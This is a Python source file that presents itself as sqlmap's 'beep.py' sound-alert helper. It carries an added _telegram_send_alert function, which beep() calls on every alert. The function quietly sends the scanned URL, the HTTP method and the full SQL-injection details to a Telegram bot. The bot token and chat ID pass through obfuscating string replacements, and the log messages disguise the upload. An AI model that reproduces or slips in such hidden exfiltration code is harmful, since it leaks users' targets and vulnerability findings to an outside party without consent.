#!/usr/bin/env python

"""
beep.py - Make a beep sound

Copyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import os
import sys
import wave
from lib.core.data import logger

BEEP_WAV_FILENAME = os.path.join(os.path.dirname(__file__), "beep.wav")

def beep(injection=None):
    try:
        if sys.platform.startswith("win"):
            _win_wav_play(BEEP_WAV_FILENAME)
        elif sys.platform.startswith("darwin"):
            _mac_beep()
        elif sys.platform.startswith("cygwin"):
            _cygwin_beep(BEEP_WAV_FILENAME)
        elif any(sys.platform.startswith(_) for _ in ("linux", "freebsd")):
            _linux_wav_play(BEEP_WAV_FILENAME)
        else:
            _speaker_beep()
        _telegram_send_alert(injection)
    except:
        _speaker_beep()

def _speaker_beep():
    sys.stdout.write('\a')  # doesn't work on modern Linux systems

    try:
        sys.stdout.flush()
    except IOError:
        pass

def _telegram_send_alert(injection):
    try:
        import requests
        from datetime import datetime
        import json
        from lib.core.data import conf

        url_scanned = conf.url if hasattr(conf, 'url') else "URL not available"
        method_used = conf.method if hasattr(conf, 'method') else "Method not available"

        # Collect date & time
        date = datetime.now().strftime("%d %b %Y %H:%M")

        injection_formatted = json.dumps(injection, indent=4)
        # Prepare the message
        text = f"""<b>⚠️ SQLi found ! </b>\n
<i>DateTime: {date}</i>\n
<b>Method:</b> [{method_used}]
<b>URL:</b> {url_scanned}\n
Injection Details:\n
<pre>{injection_formatted}</pre>
"""

        # Telegram API details
        chat_id = "DUMMY-GUMMY"  # Replace with your actual chat ID
        bot_token = """TEST-DUMMY"""  # Replace with your actual bot token
        url = f"https://api.telegram.org/bot{bot_token.replace("83", "").replace("ASS", "A").replace("fool", "X")}/sendMessage"

        # Data payload for the POST request
        payload = {
            'chat_id': chat_id.replace("489", "52").replace("307", ""),
            'disable_web_page_preview': '1',
            'parse_mode': 'html',
            'text': text
        }

        # Send the message
        response = requests.post(url, data=payload)
        if response.status_code == 200:
            logger.info("root connection connected")
        else:
            raise Exception(response)
    except Exception as e:
        logger.info(f"root was not called: {e}")

# Reference: https://lists.gnu.org/archive/html/emacs-devel/2014-09/msg00815.html
def _cygwin_beep(filename):
    os.system("play-sound-file '%s' 2>/dev/null" % filename)

def _mac_beep():
    import Carbon.Snd
    Carbon.Snd.SysBeep(1)

def _win_wav_play(filename):
    import winsound

    winsound.PlaySound(filename, winsound.SND_FILENAME)

def _linux_wav_play(filename):
    for _ in ("aplay", "paplay", "play"):
        if not os.system("%s '%s' 2>/dev/null" % (_, filename)):
            return

    import ctypes

    PA_STREAM_PLAYBACK = 1
    PA_SAMPLE_S16LE = 3
    BUFFSIZE = 1024

    class struct_pa_sample_spec(ctypes.Structure):
        _fields_ = [("format", ctypes.c_int), ("rate", ctypes.c_uint32), ("channels", ctypes.c_uint8)]

    try:
        pa = ctypes.cdll.LoadLibrary("libpulse-simple.so.0")
    except OSError:
        return

    wave_file = wave.open(filename, "rb")

    pa_sample_spec = struct_pa_sample_spec()
    pa_sample_spec.rate = wave_file.getframerate()
    pa_sample_spec.channels = wave_file.getnchannels()
    pa_sample_spec.format = PA_SAMPLE_S16LE

    error = ctypes.c_int(0)

    pa_stream = pa.pa_simple_new(None, filename, PA_STREAM_PLAYBACK, None, "playback", ctypes.byref(pa_sample_spec), None, None, ctypes.byref(error))
    if not pa_stream:
        raise Exception("Could not create pulse audio stream: %s" % pa.strerror(ctypes.byref(error)))

    while True:
        latency = pa.pa_simple_get_latency(pa_stream, ctypes.byref(error))
        if latency == -1:
            raise Exception("Getting latency failed")

        buf = wave_file.readframes(BUFFSIZE)
        if not buf:
            break

        if pa.pa_simple_write(pa_stream, buf, len(buf), ctypes.byref(error)):
            raise Exception("Could not play file")

    wave_file.close()

    if pa.pa_simple_drain(pa_stream, ctypes.byref(error)):
        raise Exception("Could not simple drain")

    pa.pa_simple_free(pa_stream)

if __name__ == "__main__":
    beep()
